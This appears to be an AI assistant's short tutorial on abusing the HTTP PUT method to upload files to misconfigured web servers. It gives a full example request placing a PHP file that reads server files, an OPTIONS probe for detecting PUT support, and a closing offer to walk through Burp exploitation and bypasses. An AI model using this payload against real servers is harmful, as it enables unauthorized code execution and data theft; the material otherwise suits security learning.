## 📌 Uploading Files Using PUT (Simple Explanation)

### 🧠 Idea

Even if a website **doesn’t have an upload form**, you might still upload files using HTTP methods like **PUT**.

---

### ⚙️ How it works

Normally:

* Browser uses **POST** to upload files

But some servers also allow:

```http id="put1"
PUT /images/exploit.php HTTP/1.1
```

👉 This directly tells the server:

> “Save this file at this path”

---

### 💥 Example Attack

```http id="put2"
PUT /images/exploit.php HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-httpd-php

<?php echo file_get_contents('/path/to/file'); ?>
```

👉 If allowed:

* File is saved as:

```id="put3"
/images/exploit.php
```

* Then you visit:

```id="put4"
/images/exploit.php
```

👉 Your PHP executes → data leak / RCE

---

### 🔍 How to check if PUT is allowed

Send:

```http id="put5"
OPTIONS /images HTTP/1.1
Host: vulnerable-website.com
```

If response includes:

```id="put6"
Allow: GET, POST, PUT
```

👉 Then PUT is enabled 🚨

---

### 🎯 Why this is dangerous

* No upload form needed
* Bypasses frontend validation
* Direct file placement on server

---

### ⚠️ When it works

* Server misconfigured (e.g., Apache, WebDAV enabled)
* No authentication or weak access control

---

### 🧾 One-line Summary

👉 If PUT is enabled, you can **upload files directly to the server without using the website UI**

---

If you want, I can show you:

* How to do this in **Burp Repeater step-by-step**
* Or how to bypass restrictions if PUT is partially blocked 😏
